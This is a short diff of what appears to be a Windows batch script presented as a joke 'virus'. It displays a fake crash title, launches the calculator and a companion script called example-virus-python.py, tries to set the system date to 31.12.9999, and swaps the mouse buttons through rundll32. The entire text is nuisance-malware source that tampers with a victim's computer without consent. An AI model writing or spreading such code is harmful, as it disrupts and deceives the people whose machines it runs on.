@@ -1,7 +1,7 @@
 echo lol
 title HAHAHAHAHAHAHAHHAH YOU COMPUTER CRASHED BECAUSE OF EXAMPLE VIRUS.EXE
 start calc
-python example-virus-python.py
+start example-virus-python.py
 date 31.12.9999
 %SystemRoot%/system32/rundll32 user32, SwapMouseButton
 md A
